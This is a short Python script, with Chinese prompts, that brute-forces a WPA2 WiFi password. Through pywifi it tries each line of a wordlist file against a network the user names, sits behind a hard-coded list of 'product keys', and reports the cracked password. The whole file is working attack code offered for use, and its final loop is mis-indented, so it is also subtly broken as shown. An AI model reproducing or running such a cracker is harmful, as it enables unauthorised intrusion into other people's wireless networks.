import pywifi
from pywifi import const
import time
import datetime

def wifiConnect(pwd,wifi_name):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = wifi_name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd
        ifaces.remove_all_network_profiles()
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")

def readPassword(wifi_name):
    print("开始破解:")
    path = "Ccsdnwifi.txt"
    file = open(path, "r")
    while True:
        try:
            pad = file.readline()
            bool = wifiConnect(pad,wifi_name)

            if bool:
                print("密码已破解： ", pad)
                print("WiFi已自动连接！！！")
                break
            else:
                print("密码破解中....密码校对: ", pad)
        except:
            continue

keys = ['GF612-K46M9-HFDCX-26454-I37G6','TP378-C82V5-LYNAO-65218-P93E3','HP853-I82E9-WTYJL-81818-H23H9','HJ127-F42O3-GBAWY-84652-Z58A5',\
        'MG971-I53O5-NWHTY-63412-H48H1','RP329-L98P5-DNNUG-28519-T81B8','RG893-V72P8-LJVQG-86616-E81C7','Dyc20140402']
while True:
key = input('产品密钥类型如下\nXXXXX-XXXXX-XXXXX-XXXXX-XXXXX\n产品密钥: ')
if key in keys:
    wifi_name = input('你要链接的WiFi: ')
    start = datetime.datetime.now()
    readPassword(wifi_name)
    end = datetime.datetime.now()
    print("破解WIFI密码一共用了多长时间：{}".format(end - start))
